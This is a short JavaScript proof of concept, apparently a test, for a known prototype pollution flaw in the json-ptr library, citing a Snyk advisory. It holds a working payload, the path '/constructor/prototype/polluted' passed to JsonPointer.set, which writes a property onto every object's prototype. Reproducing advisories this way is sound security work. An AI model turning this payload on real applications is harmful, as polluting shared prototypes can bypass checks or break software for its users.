// //https://snyk.io/vuln/SNYK-JS-JSONPTR-1016939
// test("prototype pollution in json-ptr", () => {
console.log({}.polluted);

  const { JsonPointer } = require("json-ptr");
  JsonPointer.set({}, "/constructor/prototype/polluted", "yes", true);

console.log({}.polluted);
// });
